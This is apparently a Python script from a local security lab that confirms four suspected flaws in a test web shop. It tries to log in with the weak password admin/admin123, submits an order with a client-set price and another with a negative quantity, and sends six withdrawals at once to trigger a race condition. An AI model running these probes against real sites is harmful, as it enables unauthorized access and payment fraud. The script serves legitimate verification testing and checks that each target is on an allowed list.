"""对 4 个「弱判据」命中做硬证据复核：A1 弱口令 / G1 金额篡改 / G2 负数 / G4 竞态。

判据必须落到「可观测的事实」，不能只看 HTTP 200。
"""
import http.cookiejar
import json
import pathlib
import re
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request

from guard import assert_target_allowed

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:  # noqa: BLE001
    pass

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8095").rstrip("/")
assert_target_allowed(BASE)
UA = "DSH-LabVerify/0.1"
HERE = pathlib.Path(__file__).resolve().parent


class C:
    def __init__(self):
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    def r(self, path, data=None, headers=None):
        url = BASE + path
        assert_target_allowed(url)
        body = urllib.parse.urlencode(data).encode() if isinstance(data, dict) else data
        h = {"User-Agent": UA}
        if isinstance(data, dict):
            h["Content-Type"] = "application/x-www-form-urlencoded"
        h.update(headers or {})
        try:
            with self.op.open(urllib.request.Request(url, data=body, headers=h), timeout=15) as resp:
                return resp.status, resp.read(200_000).decode("utf-8", "replace"), dict(resp.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read(200_000).decode("utf-8", "replace"), dict(e.headers or {})
        except Exception as e:  # noqa: BLE001
            return None, str(e), {}


def csrf(html):
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', html or "")
    return m.group(1) if m else None


fixed = {}

# ---- A1 弱口令：登录后能否访问「需登录」的页面并看到身份 ----
c = C()
h = c.r("/login")[1]
s, b, _ = c.r("/login", {"username": "admin", "password": "admin123", "csrf_token": csrf(h)})
s2, b2, _ = c.r("/admin/users")     # 需登录页
ok = s2 == 200 and ("用户管理" in b2 or "admin" in b2)
fixed["A1"] = (ok, f"用 admin/admin123 登录后 /admin/users → HTTP {s2}，页面含用户列表={ok}")
print(f"[A1] 弱口令硬证据: {ok} — {fixed['A1'][1]}")

# ---- G1/G2：下单后回读订单，检查 amount/qty 是否真被篡改 ----
c2 = C()
h = c2.r("/login")[1]
c2.r("/login", {"username": "demo", "password": "demo123", "csrf_token": csrf(h)})

s, b, _ = c2.r("/order/create", {"item": "dsh1", "price": "1", "qty": "1"})
oid = None
m = re.search(r'id["\s:=]+(\d+)', b or "")
if m:
    oid = m.group(1)
s_list, b_list, _ = c2.r("/api/orders")
lowb = (b_list or "").lower()
g1 = ('"amount_cents": 1' in (b_list or "")) or ('"amount_cents":1' in (b_list or ""))
fixed["G1"] = (g1, f"下单 price=1 → 订单列表出现 amount_cents=1（服务器采信客户端价格）={g1}")
print(f"[G1] 金额篡改硬证据: {g1}")

s, b, _ = c2.r("/order/create", {"item": "dsh2", "price": "100", "qty": "-5"})
s_list, b_list, _ = c2.r("/api/orders")
neg = bool(re.search(r'"qty"\s*:\s*-\d', b_list or "")) or bool(re.search(r'"amount_cents"\s*:\s*-\d', b_list or ""))
fixed["G2"] = (neg, f"下单 qty=-5 → 订单出现负数 qty/金额={neg}")
print(f"[G2] 负数数量硬证据: {neg}")

# ---- G4 竞态：并发提现后读余额，看是否超额/变负 ----
def balance_of(html):
    m = re.search(r'"balance_cents"\s*:\s*(-?\d+)', html or "") or re.search(r"余额[^0-9\-]*(-?\d+)", html or "")
    return int(m.group(1)) if m else None

c3 = C()
h = c3.r("/login")[1]
c3.r("/login", {"username": "bob", "password": "bob123", "csrf_token": csrf(h)})   # bob 余额 100
_, b0, _ = c3.r("/wallet")
before = balance_of(b0)
oks = []
lock = threading.Lock()


def w():
    cc = C()
    hh = cc.r("/login")[1]
    cc.r("/login", {"username": "bob", "password": "bob123", "csrf_token": csrf(hh)})
    st, _, _ = cc.r("/wallet/withdraw", {"amount": "100"})
    with lock:
        oks.append(st)


ts = [threading.Thread(target=w) for _ in range(6)]
[t.start() for t in ts]
[t.join() for t in ts]
_, b1, _ = c3.r("/wallet")
after = balance_of(b1)
success = len([x for x in oks if x in (200, 302)])
race = (after is not None and before is not None and (after < 0 or success > 1))
fixed["G4"] = (race, f"bob 余额 {before}→{after}，6 并发提现成功 {success} 次 → 超额扣款={race}")
print(f"[G4] 竞态硬证据: {race} — 余额 {before}→{after}，成功 {success} 次")

# ---- 回写 findings ----
fp = HERE / "lab_findings.json"
data = json.loads(fp.read_text(encoding="utf-8"))
idx = {d["id"]: d for d in data}
for vid, (ok, ev) in fixed.items():
    if vid in idx:
        idx[vid]["hit"] = bool(ok)
        idx[vid]["evidence"] = (ev + " | " + idx[vid]["evidence"])[:220]
fp.write_text(json.dumps(data, ensure_ascii=False, indent=1), encoding="utf-8")
print(f"\n复核完成，已回写 {fp.name}")
print("最终命中：" + ", ".join(sorted(d["id"] for d in data if d["hit"])))
